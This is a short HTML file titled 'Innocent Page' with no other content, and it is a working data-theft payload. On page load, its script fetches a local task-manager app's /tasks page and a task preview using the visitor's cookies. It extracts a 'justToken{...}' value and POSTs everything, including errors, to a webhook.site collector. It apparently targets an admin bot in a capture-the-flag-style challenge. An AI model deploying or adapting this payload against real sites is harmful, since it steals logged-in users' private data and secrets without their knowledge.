<!DOCTYPE html>
<html>
<head>
    <title>Innocent Page</title>
</head>
<body>
    <h1>Loading...</h1>
    
    <script>
        // Function to exfiltrate data
        async function stealAdminData() {
            try {
                // Try to fetch the admin's tasks page
                const response = await fetch('http://localhost:3000/tasks', {
                    credentials: 'include' // Include cookies
                });
                
                if (response.ok) {
                    const htmlContent = await response.text();
                    
                    // Send the HTML content to webhook
                    await fetch('https://webhook.site/6d2c182b-9cbc-4e9e-ba65-dd4abc521253', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            source: 'tasks_page',
                            content: htmlContent
                        })
                    });
                }
                
                // Also try to fetch the first task preview
                const previewResponse = await fetch('http://localhost:3000/tasks/preview/0/0', {
                    credentials: 'include'
                });
                
                if (previewResponse.ok) {
                    const previewContent = await previewResponse.text();
                    
                    // Send the preview content to webhook
                    await fetch('https://webhook.site/6d2c182b-9cbc-4e9e-ba65-dd4abc521253', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            source: 'preview_content',
                            content: previewContent,
                            token_extracted: previewContent.match(/justToken\{([^}]+)\}/)?.[1]
                        })
                    });
                }
                
            } catch (error) {
                // Send error info to webhook
                await fetch('https://webhook.site/6d2c182b-9cbc-4e9e-ba65-dd4abc521253', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        error: error.message,
                        source: 'fetch_error'
                    })
                });
            }
        }
        
        // Execute when page loads
        window.onload = stealAdminData;
        
        // Also try with a slight delay
        setTimeout(stealAdminData, 1000);
    </script>
</body>
</html>
